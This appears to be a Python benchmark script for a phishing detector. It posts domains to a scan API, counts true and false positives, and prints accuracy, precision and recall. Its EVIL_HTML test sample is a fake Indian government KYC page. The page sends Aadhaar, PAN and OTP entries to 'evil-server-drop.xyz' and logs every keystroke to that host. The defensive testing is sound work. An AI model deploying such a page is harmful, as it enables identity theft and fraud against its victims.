import os
import sys
import json
import time

# Ensure backend directory is in path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from fastapi.testclient import TestClient
from main import app

client = TestClient(app)

DATASET_PATH = os.path.join(os.path.dirname(__file__), "dataset_50_domains.json")

EVIL_HTML = """
<!DOCTYPE html>
<html>
<head><title>Update Required - Complete KYC</title></head>
<body>
    <div class="header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/55/Emblem_of_India.svg" alt="Gov Logo">
        <h1>Mandatory KYC Update</h1>
    </div>
    <form action="https://evil-server-drop.xyz/collect.php" method="POST">
        <label>Aadhaar Number:</label>
        <input type="text" name="aadhaar_no" required>
        <label>PAN Card:</label>
        <input type="text" name="pan_no" required>
        <label>OTP:</label>
        <input type="password" name="otp" required>
        <button type="submit">Verify Now</button>
    </form>
    <script>
        // Track keystrokes
        document.addEventListener('keyup', function(e) {
            fetch('https://evil-server-drop.xyz/log?k=' + e.key);
        });
    </script>
</body>
</html>
"""

def run_benchmark():
    with open(DATASET_PATH, 'r', encoding='utf-8') as f:
        domains = json.load(f)

    print(f"Starting GovShield Phishing Benchmark on {len(domains)} domains...\n")
    
    metrics = {
        "TP": 0, # Phishing caught
        "FP": 0, # Legitimate marked as phishing
        "TN": 0, # Legitimate marked as safe
        "FN": 0, # Phishing slipped through
        "failures": []
    }

    start_time = time.time()
    
    for i, item in enumerate(domains, 1):
        target_url = item["url"]
        is_phishing = item["type"] == "phishing"
        
        payload = {"url": target_url}
        if is_phishing:
            # Inject deceptive HTML for hypothetical domains so they don't just fail DNS resolution
            payload["html_content"] = EVIL_HTML

        try:
            resp = client.post("/api/scan", json=payload)
            if resp.status_code != 200:
                print(f"[{i}/{len(domains)}] ❌ ERROR on {target_url}: HTTP {resp.status_code}")
                metrics["failures"].append({"url": target_url, "error": f"HTTP {resp.status_code}"})
                continue
                
            data = resp.json()
            verdict = data.get("verdict", "")
            risk_score = data.get("risk_score", 0)
            
            # GovShield logic: PHISHING_CLONE, MALICIOUS, SUSPICIOUS are all detections
            detected_as_threat = verdict in ["PHISHING_CLONE", "MALICIOUS", "SUSPICIOUS"]
            
            if is_phishing and detected_as_threat:
                metrics["TP"] += 1
                print(f"[{i}/{len(domains)}] ✅ [TP] Caught Phishing: {target_url} (Verdict: {verdict}, Score: {risk_score})")
            elif not is_phishing and not detected_as_threat:
                metrics["TN"] += 1
                print(f"[{i}/{len(domains)}] ✅ [TN] Verified Safe: {target_url} (Verdict: {verdict}, Score: {risk_score})")
            elif not is_phishing and detected_as_threat:
                metrics["FP"] += 1
                print(f"[{i}/{len(domains)}] ❌ [FP] False Alarm! {target_url} marked as {verdict} (Score: {risk_score})")
                metrics["failures"].append({"url": target_url, "type": "FP", "verdict": verdict, "score": risk_score})
            elif is_phishing and not detected_as_threat:
                metrics["FN"] += 1
                print(f"[{i}/{len(domains)}] ❌ [FN] MISSED PHISH! {target_url} marked as {verdict} (Score: {risk_score})")
                metrics["failures"].append({"url": target_url, "type": "FN", "verdict": verdict, "score": risk_score})
                
        except Exception as e:
            print(f"[{i}/{len(domains)}] ❌ CRASH on {target_url}: {e}")
            metrics["failures"].append({"url": target_url, "error": str(e)})

    total_time = time.time() - start_time
    print("\n" + "="*50)
    print(f"BENCHMARK COMPLETE IN {total_time:.1f}s")
    print("="*50)
    print(f"True Positives (Phishing caught)   : {metrics['TP']}")
    print(f"True Negatives (Legit verified)    : {metrics['TN']}")
    print(f"False Positives (False alarms)     : {metrics['FP']}")
    print(f"False Negatives (Missed phish)     : {metrics['FN']}")
    
    total_samples = metrics['TP'] + metrics['TN'] + metrics['FP'] + metrics['FN']
    accuracy = (metrics['TP'] + metrics['TN']) / total_samples if total_samples > 0 else 0
    precision = metrics['TP'] / (metrics['TP'] + metrics['FP']) if (metrics['TP'] + metrics['FP']) > 0 else 0
    recall = metrics['TP'] / (metrics['TP'] + metrics['FN']) if (metrics['TP'] + metrics['FN']) > 0 else 0
    
    print(f"\nAccuracy  : {accuracy*100:.1f}%")
    print(f"Precision : {precision*100:.1f}%")
    print(f"Recall    : {recall*100:.1f}%")
    
    if metrics["failures"]:
        print("\n--- DETAILED FAILURES ---")
        for f in metrics["failures"]:
            print(f)
            
    # Save results to json for inspection
    result_path = os.path.join(os.path.dirname(__file__), "benchmark_results.json")
    with open(result_path, "w") as f:
        json.dump(metrics, f, indent=2)

if __name__ == "__main__":
    run_benchmark()
